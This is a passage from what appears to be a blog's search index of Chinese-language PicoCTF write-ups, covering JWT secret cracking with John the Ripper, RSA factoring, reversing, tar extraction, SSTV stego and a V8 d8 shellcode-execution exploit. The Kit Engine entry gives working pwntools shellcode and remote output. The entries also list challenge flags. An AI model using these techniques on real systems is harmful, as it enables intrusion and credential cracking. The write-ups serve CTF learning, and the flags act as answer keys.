84, 66, 107, 40, 0, 203, 138, 164, 0, 241, 9, 109, 147, 207, 85, 29, 204, 0] known_bytes = [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52] possible_key_values = [] for key_pos in range(16): known_byte = known_bytes[key_pos] current_block = 0 key_possiblities = [] possible_key_values.append(key_possiblities) target_indices = [index for index, b in enumerate(ct) if b == known_byte] for possible_key_value in range(10): byte_index = (((current_block + possible_key_value) * 16) % len(ct)) + key_pos if byte_index in target_indices: key_possiblities.append(possible_key_value) print(possible_key_values) :::\n:::spoiler 自動填入可能的key\nfrom selenium import webdriver from selenium.webdriver.common.by import By import time from tqdm import trange PATH = \u0026#39;./chromedriver.exe\u0026#39; driver = webdriver.Chrome() driver.get(\u0026#39;https://jupiter.challenges.picoctf.org/problem/17205/?#\u0026#39;) img = driver.find_element(By.ID, \u0026#34;Area\u0026#34;) ct = \u0026#39;51081803ghi63640\u0026#39; pt_guess = [] for i in range(10): for j in range(10): pt_guess.append(ct.replace(\u0026#39;g\u0026#39;, hex(j)[2:]).replace(\u0026#39;h\u0026#39;, hex(i)[2:])) for i in trange(len(pt_guess)): element = driver.find_element(By.ID, \u0026#39;user_in\u0026#39;) click = driver.find_element(By.XPATH, \u0026#34;/html/body/center/form/input[2]\u0026#34;) element.send_keys(pt_guess[i]) click.click() time.sleep(0.01) driver.refresh() :::\n首先，可以先用script 1，把資料寫到一個file中，然後用看的或是用script 2直接找，輸出如下\n[[5], [1], [0], [8], [1], [8], [0], [3], [2, 3, 4], [3, 4, 5, 6], [2, 3, 4], [6], [3], [6], [4], [0]] 有了候選的key後就可以用script 3自動填入，另外要提醒的是要先把key變成51081803ghi63640，也就是把重複的地方變成ghi，然後填入重複的次數\nKey: 5108180345363640 QRCode: Flag: picoCTF{066cad9e69c5c7e5d2784185c0feb30b}\nReference # PicoCTF Walkthru [101] - Java Script Kiddie (JavaScript debugging/reversing) \u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n[網頁漏洞] Javascript - 修正圖檔 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":277,"href":"/security/practice/picoctf/web/picoctf---jawt-scratchpad/","title":"PicoCTF - JaWT Scratchpad","section":"Securities","content":" PicoCTF - JaWT Scratchpad # Background # NTUCNS - HW3 - JWT Authentication\nRecon # 這一題蠻有趣的，有結合其他東西當作解題的基礎，先看JWT的token，decode過後的結果表示： 也就是說，token只會隨著payload而變動，所以也沒有辦法用解public key的方式重新簽署文件，另外用alg=none也會出現Authentication failed，不過作者有在網頁中有給出提示，用John，看起來就是用john-the-ripper解出token password\nExploit - Brute Force # Brute Force Password\n$ cat jwt.txt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiaGhoIn0.j1yd-PJbjNraLhhBAxZBD2C1EVIyHqlnvKh_l-iVKG8% $ ./john.exe ../jwt.txt --wordlist=../rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x]) Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ilovepico (?) 1g 0:00:00:02 DONE (2023-06-26 18:42) 0.3673g/s 2720Kp/s 2720Kc/s 2720KC/s ilovetitoelbambino..ilovejesus71 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed Token Password: ilovepico\nCheck password \u0026amp; Construct New Token Get Flag Reference # pico2019 JaWT Scratchpad "},{"id":278,"href":"/security/practice/picoctf/crypto/rsa/picoctf---john_pollard/","title":"PicoCTF - john_pollard","section":"Securities","content":" PicoCTF - john_pollard # tags: PicoCTF CTF Crypto # Background # openssl - rsa\nSource code # -----BEGIN CERTIFICATE----- MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1 BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz q16/S1WLvzg4PsElmv1f -----END CERTIFICATE----- Recon # Hint 1: The flag is in the format picoCTF{p,q} Hint 2: Try swapping p and q if it does not work 這一題就只是把certificate解出來，發現n超小，所以就直接 Exploit - openssl # $ openssl openssl x509 -in cert -pubkey -noout \u0026gt; public.pem -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- $ openssl rsa -pubin -in public.pem -text RSA Public-Key: (53 bit) Modulus: 4966306421059967 (0x11a4d45212b17f) Exponent: 65537 (0x10001) writing RSA key -----BEGIN PUBLIC KEY----- MCIwDQYJKoZIhvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQAB -----END PUBLIC KEY----- Use online tool to factor p = 67867967 q = 73176001\nFlag: picoCTF{73176001,67867967}\nReference # "},{"id":279,"href":"/security/practice/picoctf/pwn/picoctf---kit-engine/","title":"PicoCTF - Kit Engine","section":"Securities","content":" PicoCTF - Kit Engine # Background # Google V8 Engine\nV8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。\nUsing d8\nd8 is V8’s own developer shell.\nd8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the \u0026ndash;help argument for more information about usage and flags.\nConvert Bytes to Floating Point Numbers?\n\u0026gt;\u0026gt;\u0026gt; import struct \u0026gt;\u0026gt;\u0026gt; struct.pack(\u0026#39;f\u0026#39;, 3.141592654) b\u0026#39;\\xdb\\x0fI@\u0026#39; \u0026gt;\u0026gt;\u0026gt; struct.unpack(\u0026#39;f\u0026#39;, b\u0026#39;\\xdb\\x0fI@\u0026#39;) (3.1415927410125732,) \u0026gt;\u0026gt;\u0026gt; struct.pack(\u0026#39;4f\u0026#39;, 1.0, 2.0, 3.0, 4.0) \u0026#39;\\x00\\x00\\x80?\\x00\\x00\\x00@\\x00\\x00@@\\x00\\x00\\x80@\u0026#39; Source code # :::spoiler Patch\ndiff --git a/src/d8/d8.cc b/src/d8/d8.cc index e6fb20d152..35195b9261 100644 --- a/src/d8/d8.cc +++ b/src/d8/d8.cc @@ -979,6 +979,53 @@ struct ModuleResolutionData { } // namespace +uint64_t doubleToUint64_t(double d){ + union { + double d; + uint64_t u; + } conv = { .d = d }; + return conv.u; +} + +void Shell::Breakpoint(const v8::FunctionCallbackInfo\u0026lt;v8::Value\u0026gt;\u0026amp; args) { + __asm__(\u0026#34;int3\u0026#34;); +} + +void Shell::AssembleEngine(const v8::FunctionCallbackInfo\u0026lt;v8::Value\u0026gt;\u0026amp; args) { + Isolate* isolate = args.GetIsolate(); + if(args.Length() != 1) { + return; + } + + double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); + if (func == (double *)-1) { + printf(\u0026#34;Unable to allocate memory. Contact admin\\n\u0026#34;); + return; + } + + if (args[0]-\u0026gt;IsArray()) { + Local\u0026lt;Array\u0026gt; arr = args[0].As\u0026lt;Array\u0026gt;(); + + Local\u0026lt;Value\u0026gt; element; + for (uint32_t i = 0; i \u0026lt; arr-\u0026gt;Length(); i++) { + if (arr-\u0026gt;Get(isolate-\u0026gt;GetCurrentContext(), i).ToLocal(\u0026amp;element) \u0026amp;\u0026amp; element-\u0026gt;IsNumber()) { + Local\u0026lt;Number\u0026gt; val = element.As\u0026lt;Number\u0026gt;(); + func[i] = val-\u0026gt;Value(); + } + } + + printf(\u0026#34;Memory Dump. Watch your endianness!!:\\n\u0026#34;); + for (uint32_t i = 0; i \u0026lt; arr-\u0026gt;Length(); i++) { + printf(\u0026#34;%d: float %f hex %lx\\n\u0026#34;, i, func[i], doubleToUint64_t(func[i])); + } + + printf(\u0026#34;Starting your engine!!\\n\u0026#34;); + void (*foo)() = (void(*)())func; + foo(); + } + printf(\u0026#34;Done\\n\u0026#34;); +} + void Shell::ModuleResolutionSuccessCallback( const FunctionCallbackInfo\u0026lt;Value\u0026gt;\u0026amp; info) { std::unique_ptr\u0026lt;ModuleResolutionData\u0026gt; module_resolution_data( @@ -2201,40 +2248,15 @@ Local\u0026lt;String\u0026gt; Shell::Stringify(Isolate* isolate, Local\u0026lt;Value\u0026gt; value) { Local\u0026lt;ObjectTemplate\u0026gt; Shell::CreateGlobalTemplate(Isolate* isolate) { Local\u0026lt;ObjectTemplate\u0026gt; global_template = ObjectTemplate::New(isolate); - global_template-\u0026gt;Set(Symbol::GetToStringTag(isolate), - String::NewFromUtf8Literal(isolate, \u0026#34;global\u0026#34;)); + // Add challenge builtin, and remove some unintented solutions + global_template-\u0026gt;Set(isolate, \u0026#34;AssembleEngine\u0026#34;, FunctionTemplate::New(isolate, AssembleEngine)); + global_template-\u0026gt;Set(isolate, \u0026#34;Breakpoint\u0026#34;, FunctionTemplate::New(isolate, Breakpoint)); global_template-\u0026gt;Set(isolate, \u0026#34;version\u0026#34;, FunctionTemplate::New(isolate, Version)); - global_template-\u0026gt;Set(isolate, \u0026#34;print\u0026#34;, FunctionTemplate::New(isolate, Print)); - global_template-\u0026gt;Set(isolate, \u0026#34;printErr\u0026#34;, - FunctionTemplate::New(isolate, PrintErr)); - global_template-\u0026gt;Set(isolate, \u0026#34;write\u0026#34;, FunctionTemplate::New(isolate, Write)); - global_template-\u0026gt;Set(isolate, \u0026#34;read\u0026#34;, FunctionTemplate::New(isolate, Read)); - global_template-\u0026gt;Set(isolate, \u0026#34;readbuffer\u0026#34;, - FunctionTemplate::New(isolate, ReadBuffer)); - global_template-\u0026gt;Set(isolate, \u0026#34;readline\u0026#34;, - FunctionTemplate::New(isolate, ReadLine)); - global_template-\u0026gt;Set(isolate, \u0026#34;load\u0026#34;, FunctionTemplate::New(isolate, Load)); - global_template-\u0026gt;Set(isolate, \u0026#34;setTimeout\u0026#34;, - FunctionTemplate::New(isolate, SetTimeout)); - // Some Emscripten-generated code tries to call \u0026#39;quit\u0026#39;, which in turn would - // call C\u0026#39;s exit(). This would lead to memory leaks, because there is no way - // we can terminate cleanly then, so we need a way to hide \u0026#39;quit\u0026#39;. if (!options.omit_quit) { global_template-\u0026gt;Set(isolate, \u0026#34;quit\u0026#34;, FunctionTemplate::New(isolate, Quit)); } - global_template-\u0026gt;Set(isolate, \u0026#34;testRunner\u0026#34;, - Shell::CreateTestRunnerTemplate(isolate)); - global_template-\u0026gt;Set(isolate, \u0026#34;Realm\u0026#34;, Shell::CreateRealmTemplate(isolate)); - global_template-\u0026gt;Set(isolate, \u0026#34;performance\u0026#34;, - Shell::CreatePerformanceTemplate(isolate)); - global_template-\u0026gt;Set(isolate, \u0026#34;Worker\u0026#34;, Shell::CreateWorkerTemplate(isolate)); - // Prevent fuzzers from creating side effects. - if (!i::FLAG_fuzzing) { - global_template-\u0026gt;Set(isolate, \u0026#34;os\u0026#34;, Shell::CreateOSTemplate(isolate)); - } - global_template-\u0026gt;Set(isolate, \u0026#34;d8\u0026#34;, Shell::CreateD8Template(isolate)); #ifdef V8_FUZZILLI global_template-\u0026gt;Set( @@ -2243,11 +2265,6 @@ Local\u0026lt;ObjectTemplate\u0026gt; Shell::CreateGlobalTemplate(Isolate* isolate) { FunctionTemplate::New(isolate, Fuzzilli), PropertyAttribute::DontEnum); #endif // V8_FUZZILLI - if (i::FLAG_expose_async_hooks) { - global_template-\u0026gt;Set(isolate, \u0026#34;async_hooks\u0026#34;, - Shell::CreateAsyncHookTemplate(isolate)); - } - return global_template; } @@ -2449,10 +2466,10 @@ void Shell::Initialize(Isolate* isolate, D8Console* console, v8::Isolate::kMessageLog); } - isolate-\u0026gt;SetHostImportModuleDynamicallyCallback( + /*isolate-\u0026gt;SetHostImportModuleDynamicallyCallback( Shell::HostImportModuleDynamically); isolate-\u0026gt;SetHostInitializeImportMetaObjectCallback( - Shell::HostInitializeImportMetaObject); + Shell::HostInitializeImportMetaObject);*/ #ifdef V8_FUZZILLI // Let the parent process (Fuzzilli) know we are ready. diff --git a/src/d8/d8.h b/src/d8/d8.h index a6a1037cff..4591d27f65 100644 --- a/src/d8/d8.h +++ b/src/d8/d8.h @@ -413,6 +413,9 @@ class Shell : public i::AllStatic { kNoProcessMessageQueue = false }; + static void AssembleEngine(const v8::FunctionCallbackInfo\u0026lt;v8::Value\u0026gt;\u0026amp; args); + static void Breakpoint(const v8::FunctionCallbackInfo\u0026lt;v8::Value\u0026gt;\u0026amp; args); + static bool ExecuteString(Isolate* isolate, Local\u0026lt;String\u0026gt; source, Local\u0026lt;Value\u0026gt; name, PrintResult print_result, ReportExceptions report_exceptions, :::\nRecon # 這一題很有趣，不過我原本不知道v8或d8是啥東東，以為是類似老舊攝影機???但看了12的WP，發現沒有想像中的複雜，首先他給了一個d8(也就是local端可以使用的v8，類似psysh的感覺，可以執行js的環境)，然後他有給一個patch，所以不用管其他的部分，只要專注在他patch的內容即可。\ndiff 從patch file可以看得出來他新實作了三個function: uint64_t doubleToUint64_t(double d), void Shell::Breakpoint(const v8::FunctionCallbackInfo\u0026lt;v8::Value\u0026gt;\u0026amp; args), void Shell::AssembleEngine(const v8::FunctionCallbackInfo\u0026lt;v8::Value\u0026gt;\u0026amp; args)，其中Breakpoint和AssembleEngine都是繼承Shell class，然後AssembleEngine需要傳入args的參數 Analyze AssembleEngine Function 在patch的33行中，會判斷傳入的args是不是array，然後array中每一個element都要是number，接著就會把value放到前面定義的func(其實就是function pointer)，再後面的for loop做的事情是把func中每一個element轉data type，從double轉成unsinged integer 64，接著就直接call這個function Construct Payload 基於以上觀察，我們知道AssembleEngine可以直接執行我們給他的shellcode，只不過需要花心思在他的data type檢查，也就是args需要是array，且每一個element都必須是double才行 Exploit - Build Shell Code \u0026amp; Transfer Data Type # from pwn import * import struct context.arch = \u0026#39;amd64\u0026#39; if args.REMOTE: ls = asm(shellcraft.execve(b\u0026#34;/bin/ls\u0026#34;, [\u0026#34;ls\u0026#34;])) cat = asm(shellcraft.execve(b\u0026#34;/bin/cat\u0026#34;, [\u0026#34;cat\u0026#34;, \u0026#34;flag.txt\u0026#34;])) r = remote(\u0026#39;mercury.picoctf.net\u0026#39;, 48700) else: ls = b\u0026#39;H\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8.cho.mr\\x01H1\\x04$H\\x89\\xe7hmr\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\u0026#39; cat = b\u0026#39;j\\x01\\xfe\\x0c$H\\xb8/bin/catPH\\x89\\xe7h.txtH\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8b`u\\x01gm`fH1\\x04$1\\xf6Vj\\x0c^H\\x01\\xe6Vj\\x10^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\u0026#39; r = process([\u0026#39;python\u0026#39;, \u0026#39;server.py\u0026#39;]) log.info(f\u0026#39;ls shellcode: {ls}\u0026#39;) log.info(f\u0026#39;cat flag.txt shellcode: {cat}\u0026#39;) def Transfer2DoubleArray(shellcode): shell_array = [] if len(shellcode) % 8 \u0026gt; 0: shellcode += (8 - len(shellcode) % 8) * b\u0026#39;\\x00\u0026#39; for i in range(0, len(shellcode), 8): double_tmp = struct.unpack(\u0026#39;d\u0026#39;, shellcode[i:i+8])[0] shell_array.append(double_tmp) return shell_array payload = f\u0026#39;AssembleEngine({Transfer2DoubleArray(ls)})\u0026#39; r.recvuntil(b\u0026#39;Provide size. Must be \u0026lt; 5k:\u0026#39;) r.sendline(str(len(payload)).encode()) r.recvline() r.sendline(payload.encode()) print(r.recvall().decode()) r.close() if args.REMOTE: r = remote(\u0026#39;mercury.picoctf.net\u0026#39;, 48700) else: r = process([\u0026#39;python\u0026#39;, \u0026#39;server.py\u0026#39;]) payload = f\u0026#39;AssembleEngine({Transfer2DoubleArray(cat)})\u0026#39; r.recvuntil(b\u0026#39;Provide size. Must be \u0026lt; 5k:\u0026#39;) r.sendline(str(len(payload)).encode()) r.recvline() r.sendline(payload.encode()) print(r.recvall().decode()) :::spoiler Local Result\n$ python exp.py [+] Starting local process \u0026#39;/home/sbk6401/anaconda3/envs/CTF/bin/python\u0026#39;: pid 19347 [*] ls shellcode: b\u0026#39;H\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8.cho.mr\\x01H1\\x04$H\\x89\\xe7hmr\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\u0026#39; [*] cat flag.txt shellcode: b\u0026#39;j\\x01\\xfe\\x0c$H\\xb8/bin/catPH\\x89\\xe7h.txtH\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8b`u\\x01gm`fH1\\x04$1\\xf6Vj\\x0c^H\\x01\\xe6Vj\\x10^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\u0026#39; [+] Receiving all data: Done (334B) [*] Process \u0026#39;/home/sbk6401/anaconda3/envs/CTF/bin/python\u0026#39; stopped with exit code 0 (pid 19347) AssembleEngine([7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316]) File written. Running. Timeout is 20s Run Complete Stdout b\u0026#39;d8\\nexp-nickchen.py\\nexp.py\\nflag.txt\\nserver.py\\nsource\\n\u0026#39; Stderr b\u0026#39;\u0026#39; [+] Starting local process \u0026#39;/home/sbk6401/anaconda3/envs/CTF/bin/python\u0026#39;: pid 19366 [+] Receiving all data: Done (340B) [*] Process \u0026#39;/home/sbk6401/anaconda3/envs/CTF/bin/python\u0026#39; stopped with exit code 0 (pid 19366) AssembleEngine([8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316]) File written. Running. Timeout is 20s Run Complete Stdout b\u0026#39;picoCTF{test_132}\u0026#39; Stderr b\u0026#39;\u0026#39; ::: :::spoiler Remote Result\n$ python exp.py REMOTE [+] Opening connection to mercury.picoctf.net on port 48700: Done [*] ls shellcode: b\u0026#39;H\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8.cho.mr\\x01H1\\x04$H\\x89\\xe7hmr\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\u0026#39; [*] cat flag.txt shellcode: b\u0026#39;j\\x01\\xfe\\x0c$H\\xb8/bin/catPH\\x89\\xe7h.txtH\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01PH\\xb8b`u\\x01gm`fH1\\x04$1\\xf6Vj\\x0c^H\\x01\\xe6Vj\\x10^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05\u0026#39; [+] Receiving all data: Done (334B) [*] Closed connection to mercury.picoctf.net port 48700 AssembleEngine([7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316]) File written. Running. Timeout is 20s Run Complete Stdout b\u0026#39;d8\\nflag.txt\\nserver.py\\nsource.tar.gz\\nxinet_startup.sh\\n\u0026#39; Stderr b\u0026#39;\u0026#39; [+] Opening connection to mercury.picoctf.net on port 48700: Done [+] Receiving all data: Done (362B) [*] Closed connection to mercury.picoctf.net port 48700 AssembleEngine([8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316]) File written. Running. Timeout is 20s Run Complete Stdout b\u0026#39;picoCTF{vr00m_vr00m_48f07b402a4020e0}\\n\u0026#39; Stderr b\u0026#39;\u0026#39; :::\nFlag: picoCTF{vr00m_vr00m_48f07b402a4020e0}\nReference # V8 exploitation - picoCTF Kit Engine\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nKit Engine - maple\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":280,"href":"/security/practice/picoctf/reverse/picoctf---lets-get-dynamic/","title":"PicoCTF - Let's get dynamic","section":"Securities","content":" PicoCTF - Let\u0026rsquo;s get dynamic # Source code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+1Ch] [rbp-114h] char s2[64]; // [rsp+20h] [rbp-110h] BYREF char s[64]; // [rsp+60h] [rbp-D0h] BYREF char v7[8]; // [rsp+A0h] [rbp-90h] BYREF __int64 v8; // [rsp+A8h] [rbp-88h] __int64 v9; // [rsp+B0h] [rbp-80h] __int64 v10; // [rsp+B8h] [rbp-78h] __int64 v11; // [rsp+C0h] [rbp-70h] __int64 v12; // [rsp+C8h] [rbp-68h] __int16 v13; // [rsp+D0h] [rbp-60h] __int64 v14[6]; // [rsp+E0h] [rbp-50h] __int16 v15; // [rsp+110h] [rbp-20h] unsigned __int64 v16; // [rsp+118h] [rbp-18h] v16 = __readfsqword(0x28u); *v7 = 0xFD872AC7CA737102LL; v8 = 0x4915F12BF9F82DCBLL; v9 = 0xA7EF0D4C54003C10LL; v10 = 0x9399CCF74D02A843LL; v11 = 0x2AC6F818989688D7LL; v12 = 0x9F51EBCA33584C85LL; v13 = 231; v14[0] = 0x92D46893B5010A61LL; v14[1] = 0xA6BDE59D58F4EB4LL; v14[2] = 0xFC993A3238355027LL; v14[3] = 0xEDA7B28D7054D179LL; v14[4] = 0x419FBB499BD4CFBBLL; v14[5] = 0x935AE3903F554688LL; v15 = 185; fgets(s, 49, _bss_start); for ( i = 0; i \u0026lt; strlen(v7); ++i ) s2[i] = *(v14 + i) ^ v7[i] ^ i ^ 0x13; if ( !memcmp(s, s2, 49uLL) ) { puts(\u0026#34;No, that\u0026#39;s not right.\u0026#34;); return 1; } else { puts(\u0026#34;Correct! You entered the flag.\u0026#34;); return 0; } } :::\nRecon # 這一題也沒有很難，就要用dbg細心的跟一下，然後不太確定這一題設計的用意，但無論如何還是蠻直觀的 可以看到IDA解析的source code中間有一段是在進行encryption，然後只要反著做就可以拿到flag，但重點是他實際跑起來會和肉眼觀察到的有一點不一樣，一開始讀取的時候會從v7的後端以及v14[0]的後端開始xor，所以如果像我要從兩者最後一個byte開始解密的話，index的i就要特別注意，不過我也是建議要從第一個byte開始解密，因為這樣會對應到flag的第一個字元，所以如果不知道這支程式怎麼加密的話，可以直接跑下面的script，用debugger追一下就知道了\nExploit # enc_flag = [[0x92, 0xD4, 0x68, 0x93, 0xB5, 0x01, 0x0A, 0x61, ], [0x0A, 0x6B, 0xDE, 0x59, 0xD5, 0x8F, 0x4E, 0xB4, ], [0xFC, 0x99, 0x3A, 0x32, 0x38, 0x35, 0x50, 0x27, ], [0xED, 0xA7, 0xB2, 0x8D, 0x70, 0x54, 0xD1, 0x79, ], [0x41, 0x9F, 0xBB, 0x49, 0x9B, 0xD4, 0xCF, 0xBB, ], [0x93, 0x5A, 0xE3, 0x90, 0x3F, 0x55, 0x46, 0x88]]# 0x7fffffffd660 key = [[0xFD, 0x87, 0x2A, 0xC7, 0xCA, 0x73, 0x71, 0x02, ], [0x49, 0x15, 0xF1, 0x2B, 0xF9, 0xF8, 0x2D, 0xCB, ], [0xA7, 0xEF, 0x0D, 0x4C, 0x54, 0x00, 0x3C, 0x10, ], [0x93, 0x99, 0xCC, 0xF7, 0x4D, 0x02, 0xA8, 0x43, ], [0x2A, 0xC6, 0xF8, 0x18, 0x98, 0x96, 0x88, 0xD7, ], [0x9F, 0x51, 0xEB, 0xCA, 0x33, 0x58, 0x4C, 0x85]]# 0x7fffffffd620 FLAG = [] for i in range(len(enc_flag)): for j in range(len(enc_flag[0])): FLAG.append(bytes.fromhex(hex(enc_flag[i][7-j] ^ key[i][7-j] ^ 0x13 ^ (j + 8 * i))[2:]).decode(\u0026#39;utf-8\u0026#39;)) print(\u0026#34;\u0026#34;.join(FLAG) + \u0026#34;}\u0026#34;) Flag: picoCTF{dyn4m1c_4n4ly1s_1s_5up3r_us3ful_6044e660}\n"},{"id":281,"href":"/security/practice/picoctf/misc/general/picoctf---like1000/","title":"PicoCTF - like1000","section":"Securities","content":" PicoCTF - like1000 # tags: PicoCTF CTF Misc # Challenge: like1000\nBackground # How to extract nested tar.gz files easily? Shell Script - While\nExploit - Untar 1000 times # For untar folders #! /bin/bash PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH file_name=1000 for next in ${file_name}.tar while [ $file_name \u0026gt; 1 ] do echo \u0026#34;Untaring - $file_name\u0026#34; tar -xvf ${file_name}.tar #-C ./ file_name=$(($file_name-1)) mkdir ./$file_name mv ${file_name}.tar ./$file_name cd ./${file_name} done For getting flag #! /bin/bash PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH file_name=999 while [ \u0026#34;$file_name\u0026#34; \u0026gt; \u0026#34;0\u0026#34; ] do cd ./${file_name} file_name=$(($file_name-1)) if [ \u0026#34;$file_name\u0026#34; == \u0026#34;0\u0026#34; ] then ls -al cat filler.txt mv flag.png ~/CTF/PicoCTF/Misc/like1000 fi done exit 0 Reference # Shell Script 變數相加 How to solve gzip: stdin: not in gzip format error 解压缩报错tar: Error is not recoverable: exiting now In a bash script, using the conditional \u0026ldquo;or\u0026rdquo; in an \u0026ldquo;if\u0026rdquo; statement\n"},{"id":282,"href":"/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk/","title":"PicoCTF - m00nwalk","section":"Securities","content":" PicoCTF - m00nwalk # tags: PicoCTF CTF Misc # Challenge: m00nwalk\nDescription \u0026amp; Hint # Decode this message from the moon. Hint:\nHow did pictures from the moon landing get sent back to Earth? What is the CMU mascot?, that might help select a RX option Background # 慢掃描電視 - slow-scan television(sstv)\nSource code # Exploit - qsstv + # First, I thought it might be a mp3stego problem but found nothing. So, I tried to find the write up about this question. Use QSSTV $ sudo apt-get install pavucontrol $ sudo apt-get install qsstv $ pactl load-module module-null-sink sink_name=virtual-cable 22 The Setting pavucontrol\n$ pavucontrol # then it should show up a GUI interface Note that must set the output from Null(Monitor of Null Output) qsstv\n$ qsstv # again, it should show up a GUI interface * Note that the Audio Interface should be PaulseAudio\nThen we can start to record in qsstv and set the command $ paplay -d virtual-cable message.wav After finish the recording, we\u0026rsquo;ll got a png file that contains the flag Note that, the sequence of the audio is message.wmv $\\to$ pavucontrol $\\to$ qsstv. The main job of pavucontrol is to manage the audio that we play and send it to the right application(e.g. qsstv) Reference # m00nwalk - write up\n"},{"id":283,"href":"/security/practice/picoctf/misc/image-stego/picoctf---m00nwalk2/","title":"PicoCTF - m00nwalk2","section":"Securities","content":" PicoCTF - m00nwalk2 # tags: PicoCTF CTF Misc # Challenge: m00nwalk2\nDescription \u0026amp; Hint # Revisit the last transmission. We think this transmission contains a hidden message. There are also some clues clue 1, clue 2, clue 3.\nHint:\nUse the clues to extract the another flag from the .wav file Background # m00nwalk\nExploit - QSSTV # Follow the write up of m00nwalk then you\u0026rsquo;ll get 3 images from 3 clues respectively. Search Alan Eliasen the Future Boy It\u0026rsquo;s a website that contains encoding steganography files. So, we select the message file and enter the password Then we got the flag picoCTF{the_answer_lies_hidden_in_plain_sight}\n"},{"id":284,"href":"/security/practice/picoctf/misc/general/picoctf---macrohard-weakedge/","title":"PicoCTF - MacroHard WeakEdge","section":"Securities","content":" PicoCTF - MacroHard WeakEdge # tags: PicoCTF CTF Misc # Challenge: MacroHard WeakEdge\nBackground # What is a PPTM file? It\u0026rsquo;s a zip format file\nA PPTM file is a macro-enabled presentation created by Microsoft PowerPoint, an application used to create presentations and slide shows. It contains a collection of slides, which typically includes text, layout, images, and embedded macros. PPTM files are commonly used to store business, marketing, and academic presentations.\nMore information # PPTM files are similar to .PPTX files, which utilize the Open XML document format introduced in Microsoft Office 2007. However, PPTM 